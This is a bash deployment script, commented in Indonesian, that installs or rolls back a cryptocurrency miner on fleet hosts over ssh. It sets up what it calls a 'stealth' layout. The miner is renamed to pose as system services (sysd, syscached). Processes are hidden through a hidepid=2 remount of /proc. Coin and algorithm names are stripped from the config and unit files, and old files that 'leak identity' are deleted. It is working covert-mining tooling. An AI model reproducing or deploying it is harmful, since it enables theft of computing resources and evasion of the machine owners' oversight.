#!/usr/bin/env bash
# apply.sh — pasang atau rollback miner sysd di satu host.
#
#   apply.sh install STAMP NEWDIR [EXPECT_VERSION]
#   apply.sh rollback [STAMP]
#
# Dipanggil deploy.sh lewat ssh; untuk pemakaian darurat bisa dijalankan manual.
#
# Layout stealth di host:
#   /usr/local/sbin/sysd            binary (0750 root:root; menggantikan wrapper lama)
#   /usr/local/sbin/libsyscache.so  library (0640 root:root, RPATH $ORIGIN)
#   /etc/sysd/miner.env             0600 (migrasi dari /etc/xcb/miner.env, baris
#                                   XCB_TITLE dibuang)
#   /etc/systemd/system/syscached.service          unit baru dari ops/systemd/
#   /etc/systemd/system/sysd-proc-hidepid.service  menggantikan
#                                   xcb-proc-hidepid.service (dimatikan + dihapus)
#
# Backup per stamp: /root/sysd-rollback-<stamp> (0700 root) berisi salinan cp -a
# dari setiap file yang disentuh plus manifest files.list berformat
# backupfilename<TAB>tujuan<TAB>mode. Rollback memulihkan unit + config + hidepid
# + binary + library bersamaan dari manifest itu.
set -uo pipefail

SVC="${SVC:-syscached}"
BIN="${BIN:-/usr/local/sbin/sysd}"
LIB="${LIB:-/usr/local/sbin/libsyscache.so}"
OLD_BIN="${OLD_BIN:-/usr/local/bin/xcb}"
OLD_LIB="${OLD_LIB:-/usr/local/bin/librandomx_v2.so}"
OLD_CONF="${OLD_CONF:-/etc/xcb/miner.env}"
CONF="${CONF:-/etc/sysd/miner.env}"
CONF_DIR="${CONF_DIR:-/etc/sysd}"
UNIT="${UNIT:-/etc/systemd/system/syscached.service}"
HIDE_UNIT="${HIDE_UNIT:-/etc/systemd/system/sysd-proc-hidepid.service}"
OLD_HIDE_UNIT="${OLD_HIDE_UNIT:-/etc/systemd/system/xcb-proc-hidepid.service}"
HIDE_DROPIN="${HIDE_DROPIN:-/etc/systemd/system/syscached.service.d/10-hidepid.conf}"
HUGE_UNIT="${HUGE_UNIT:-/etc/systemd/system/syscache-hugepages.service}"
WAIT_S="${WAIT_S:-120}"
BACKUP_ROOT="${BACKUP_ROOT:-/root/sysd-rollback}"

die() { echo "FATAL: $*" >&2; exit 1; }
say() { echo "$*"; }

# Die pada fase backup: belum ada file yang dimutasi, kondisi lama masih utuh —
# hidupkan lagi service supaya host tidak ditinggal tanpa miner.
die_backup() {
    echo "FATAL: $*" >&2
    sudo -n systemctl start "$SVC" 2>/dev/null || true
    exit 1
}

# --version hanya aman untuk binary ELF. Wrapper lama /usr/local/sbin/sysd
# (skrip 3 baris) mengeksekusi miner foreground dan mengabaikan argv, jadi
# skrip tidak pernah dijalankan; deteksi lewat dua byte pertama "#!".
bin_version() {
    local target=$1
    sudo -n test -f "$target" || return 1
    [ "$(sudo -n head -c 2 -- "$target" 2>/dev/null)" = "#!" ] && return 1
    sudo -n "$target" --version 2>&1 | head -1
}

newest_stamp() {
    local d
    # /root tidak bisa dibaca user biasa — glob harus dieksekusi sebagai root.
    # shellcheck disable=SC2012  # BACKUP_ROOT terkontrol, tanpa spasi
    d=$(sudo -n sh -c 'ls -1dt "$1"-* 2>/dev/null | head -1' sh "$BACKUP_ROOT") || return 1
    [ -n "$d" ] || return 1
    printf '%s\n' "${d#"$BACKUP_ROOT"-}"
}

# backup_file SRC BACKUPDIR — salin dengan cp -a (mode/owner ikut), lalu catat
# di BACKUPDIR/files.list: backupfilename<TAB>tujuan<TAB>mode (mode asli dari
# stat -c %a) supaya rollback memulihkan persis.
backup_file() {
    local src=$1 bd=$2 name mode
    name=$(basename "$src")
    sudo -n cp -a -- "$src" "$bd/$name" || die_backup "backup $src gagal"
    mode=$(sudo -n stat -c %a -- "$src") || die_backup "stat $src gagal"
    printf '%s\t%s\t%s\n' "$name" "$src" "$mode" |
        sudo -n tee -a "$bd/files.list" >/dev/null ||
        die_backup "tulis manifest $bd/files.list gagal"
}

wait_ready() {
    local since=$1 deadline=$(( $(date +%s) + WAIT_S ))
    while [ "$(date +%s)" -lt "$deadline" ]; do
        if sudo -n journalctl -u "$SVC" --since "@$since" --no-pager 2>/dev/null |
             grep -q "Dataset siap"; then
            return 0
        fi
        sleep 3
    done
    return 1
}

cmd_rollback() {
    local stamp=${1:-} bd name dest mode ver
    if [ -z "$stamp" ]; then
        stamp=$(newest_stamp) || die "tidak ada backup di $BACKUP_ROOT-<stamp>"
    fi
    bd="$BACKUP_ROOT-$stamp"
    sudo -n test -d "$bd" || die "backup $bd tidak ada"
    sudo -n test -f "$bd/files.list" || die "manifest $bd/files.list tidak ada"

    sudo -n systemctl stop "$SVC" || true
    # Manifest ada di dalam dir 0700 root — dibaca lewat sudo. Proses
    # substitution menjaga loop tetap di shell utama sehingga die() keluar
    # sungguhan, bukan hanya dari subshell pipe.
    while IFS=$'\t' read -r name dest mode; do
        [ -n "$name" ] || continue
        sudo -n test -f "$bd/$name" ||
            die "backup $bd/$name hilang; rollback dibatalkan agar tidak pulih setengah"
        sudo -n install -m "$mode" "$bd/$name" "$dest" ||
            die "restore $dest gagal"
    done < <(sudo -n cat -- "$bd/files.list")

    sudo -n systemctl daemon-reload || true
    sudo -n systemctl start "$SVC" || true
    sleep 2
    say "restored=$stamp"
    # BIN setelah rollback bisa berupa wrapper lama (tanpa --version) —
    # jatuh ke binary asli bila ada.
    ver=$(bin_version "$BIN" || true)
    [ -n "$ver" ] || ver=$(bin_version "$OLD_BIN" || true)
    say "ver=$ver"
    say "svc=$(systemctl is-active "$SVC")"
}

cmd_install() {
    local stamp=$1 newdir=$2 expect=${3:-}
    local oldver="" ver="" ok libok since bd huge_rewrite=0

    # Pre-flight: verifikasi staging sebelum menyentuh miner yang sedang jalan.
    [ -x "$newdir/xcb" ] || die "$newdir/xcb tidak ada"
    [ -f "$newdir/libsyscache.so" ] || die "$newdir/libsyscache.so tidak ada"
    bd="$BACKUP_ROOT-$stamp"

    sudo -n systemctl stop "$SVC" || true

    sudo -n install -d -m 0700 "$bd" || die_backup "gagal buat $bd"

    # Backup setiap file yang akan disentuh, semuanya sebelum mutasi pertama.
    # Di armada saat ini $BIN adalah wrapper lama 200 byte — tetap dibackup.
    # CONF dan OLD_CONF dibackup independen: pada re-deploy keduanya bisa ada,
    # dan keduanya yang mungkin dibuang di akhir install.
    if sudo -n test -f "$BIN"; then backup_file "$BIN" "$bd"; fi
    if sudo -n test -f "$LIB"; then backup_file "$LIB" "$bd"; fi
    if sudo -n test -f "$OLD_BIN"; then backup_file "$OLD_BIN" "$bd"; fi
    if sudo -n test -f "$OLD_LIB"; then backup_file "$OLD_LIB" "$bd"; fi
    if sudo -n test -f "$UNIT"; then backup_file "$UNIT" "$bd"; fi
    if sudo -n test -f "$CONF"; then backup_file "$CONF" "$bd"; fi
    if sudo -n test -f "$OLD_CONF"; then backup_file "$OLD_CONF" "$bd"; fi
    if sudo -n test -f "$OLD_HIDE_UNIT"; then backup_file "$OLD_HIDE_UNIT" "$bd"; fi
    if sudo -n test -f "$HIDE_DROPIN"; then backup_file "$HIDE_DROPIN" "$bd"; fi
    # HUGE_UNIT akan ditulis ulang hanya bila memuat nama algoritma lama.
    if sudo -n test -f "$HUGE_UNIT" && sudo -n grep -q "RandomX" "$HUGE_UNIT"; then
        backup_file "$HUGE_UNIT" "$bd"
        huge_rewrite=1
    fi

    # Versi miner lama, untuk baris old= di akhir. Pada armada saat ini BIN
    # adalah wrapper; bin_version menolak skrip dan jatuh ke OLD_BIN.
    oldver=$(bin_version "$BIN" || true)
    [ -n "$oldver" ] || oldver=$(bin_version "$OLD_BIN" || true)
    say "old=$oldver"

    ok=1
    sudo -n install -m 0750 "$newdir/xcb" "$BIN" || ok=0
    sudo -n install -m 0640 "$newdir/libsyscache.so" "$LIB" || ok=0
    sudo -n install -d -m 0755 "$CONF_DIR" || ok=0

    # Interlock: migrasi config + pemasangan unit baru hanya bila unit baru
    # benar-benar ada di staging — env tidak pernah pindah ke /etc/sysd tanpa
    # unit yang menunjuk ke path baru itu.
    if [ "$ok" = 1 ]; then
        if [ ! -f "$newdir/syscached.service" ]; then
            say "syscached.service tidak ada di staging; migrasi config/unit dilewati"
            ok=0
        else
            if ! sudo -n test -f "$CONF" && sudo -n test -f "$OLD_CONF"; then
                sudo -n install -m 0600 "$OLD_CONF" "$CONF" || ok=0
                sudo -n sed -i '/^XCB_TITLE=/d' "$CONF" || ok=0
                sudo -n chmod 0600 "$CONF" || ok=0
            fi
            sudo -n install -m 0644 "$newdir/syscached.service" "$UNIT" || ok=0
            sudo -n install -d -m 0755 -- "$(dirname "$HIDE_DROPIN")" || ok=0
            sudo -n tee "$HIDE_UNIT" >/dev/null <<'EOF' || ok=0
[Unit]
Description=Hide other users' processes in /proc
DefaultDependencies=no
After=local-fs.target
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/bin/mount -o remount,hidepid=2 /proc
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
            sudo -n tee "$HIDE_DROPIN" >/dev/null <<'EOF' || ok=0
[Unit]
Wants=sysd-proc-hidepid.service
After=sysd-proc-hidepid.service
EOF
            sudo -n chmod 0644 "$HIDE_UNIT" "$HIDE_DROPIN" || ok=0
            # Unit hidepid lama dimatikan dan dihapus (sudah ada di backup).
            sudo -n systemctl disable --now "$OLD_HIDE_UNIT" 2>/dev/null || true
            sudo -n rm -f -- "$OLD_HIDE_UNIT" || true
            # Enable unit hidepid baru supaya remount juga jalan di boot,
            # konsisten dengan install.sh (Wants= drop-in hanya mencakup
            # start yang dipicu syscached).
            sudo -n systemctl enable "$HIDE_UNIT" >/dev/null 2>&1 || true
            if [ "$huge_rewrite" = 1 ]; then
                sudo -n sed -i 's/^Description=.*/Description=Allocate hugepages for sysd/' "$HUGE_UNIT" || ok=0
                say "hugepages unit: Description diganti"
            fi
            sudo -n systemctl daemon-reload || ok=0
        fi
    fi

    libok=$(sudo -n ldd "$BIN" 2>/dev/null | grep -c "libsyscache.so =>")
    ver=$(bin_version "$BIN" || true)
    say "new=$ver"
    say "libok=$libok"

    if [ "$ok" != 1 ] || [ "$libok" != 1 ] ||
       { [ -n "$expect" ] && ! printf '%s' "$ver" | grep -qF -- "$expect"; }; then
        say "HASIL=ROLLBACK"
        cmd_rollback "$stamp"
        return 1
    fi

    since=$(date +%s)
    if ! sudo -n systemctl start "$SVC"; then
        say "service gagal start"
        say "HASIL=ROLLBACK"
        cmd_rollback "$stamp"
        return 1
    fi
    if ! wait_ready "$since"; then
        say "miner tidak siap dalam ${WAIT_S}s"
        say "HASIL=ROLLBACK"
        cmd_rollback "$stamp"
        return 1
    fi

    # Sukses: buang binary, library, dan config lama yang masih membocorkan
    # identitas (world-readable binary; direktori /etc/xcb bernama koin) —
    # semuanya sudah dibackup, rollback mengembalikannya dari manifest.
    sudo -n rm -f -- "$OLD_BIN" "$OLD_LIB" "$OLD_CONF"
    sudo -n rmdir -- "$(dirname "$OLD_CONF")" 2>/dev/null || true

    say "svc=$(systemctl is-active "$SVC")"
    sudo -n journalctl -u "$SVC" --since "@$since" --no-pager 2>/dev/null |
        grep -E "Pool login|Dataset siap|Mining pool|HR " | tail -4
    say "HASIL=OK"
}

case "${1:-}" in
    install)
        shift
        [ $# -ge 2 ] || die "usage: apply.sh install STAMP NEWDIR [EXPECT_VERSION]"
        cmd_install "$@"
        ;;
    rollback)
        shift
        cmd_rollback "${1:-}"
        ;;
    *)
        echo "usage: apply.sh install STAMP NEWDIR [EXPECT_VERSION]" >&2
        echo "       apply.sh rollback [STAMP]" >&2
        exit 2
        ;;
esac
